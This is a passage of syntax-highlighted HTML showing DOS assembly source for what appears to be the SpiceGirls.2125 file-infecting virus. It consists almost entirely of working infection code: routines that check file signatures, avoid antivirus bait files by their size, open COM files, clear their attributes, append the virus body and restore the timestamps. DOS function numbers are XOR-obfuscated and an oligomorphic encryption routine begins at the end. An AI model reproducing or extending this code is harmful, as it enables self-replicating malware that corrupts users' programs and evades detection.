         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">3d00h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Open file (read)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">tst_sig_exit</span><span class="sc0">    </span><span class="sc1">; Error? Jump to tst_sig_exit</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">exe_head_sig</span><span class="sc0">     </span><span class="sc1">; DX = offset of exe_head_sig</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Read two bytes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; AX = EXE signature</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">exe_head_sig</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Found EXE signature?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_sig_exit</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_sig_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc12">'MZ'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; AX = EXE signature</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">exe_head_sig</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Found EXE signature?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_sig_exit</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_sig_exit</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">tst_sig_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">tst_filesize</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Test filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">3d00h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Open file (read)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">4202h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">tst_siz_exit</span><span class="sc0">    </span><span class="sc1">; Filesize too small? Jump to tst_...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Filesize too large?</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">tst_siz_exit</span><span class="sc0">    </span><span class="sc1">; Above? Jump to tst_siz_exit</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ea60h</span><span class="sc0">       </span><span class="sc1">; Filesize too large?</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">tst_siz_exit</span><span class="sc0">    </span><span class="sc1">; Above? Jump to tst_siz_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">origin_off</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store offset of original code</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Divide by pages</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Bait file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_siz_exit</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_siz_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">origin_off</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Store offset of original code</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3e8h</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Divide by thousands</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Bait file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_siz_exit</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_siz_exit</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">tst_siz_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int21_simula</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Simulate interrupt 21h</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Infect COM file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">4300h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Get file attributes</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_attr</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">; Store file attributes</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">4301h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Set file attributes</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CX = new file attributes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">3d02h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Open file (read/write)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">load_info</span><span class="sc0">       </span><span class="sc1">; No error? Jump to load_info</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_exit_</span><span class="sc0">
</span><span class="sc5">load_info</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">5700h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Set file's date and time</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">file_time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">; Store file time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">file_date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">; Store file date</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0bf00h</span><span class="sc0">       </span><span class="sc1">; AX = segment of text video RAM</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS =    "    "   "     "    "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">4202h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack (AX)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">4200h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">origin_off</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Store offset of original code</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Divide by pages</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">pages_in_fil</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store total number of 512-bytes ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bytes_on_las</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">   </span><span class="sc1">; Store number of bytes on last 51...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0bf00h</span><span class="sc0">       </span><span class="sc1">; AX = segment of text video RAM</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS =    "    "   "     "    "</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">spice_oligo</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">5701h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Set file's date and time</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">file_time</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; CX = file time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">file_date</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; DX = file date</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
</span><span class="sc5">infect_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">4301h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Set file attributes</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">name_pointer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_attr</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; CX = file attributes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_pointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">spice_oligo</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; SpiceGirls.2125 oligomorphic engine</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (DS)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; AL = 8-bit random number</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">crypt_key</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
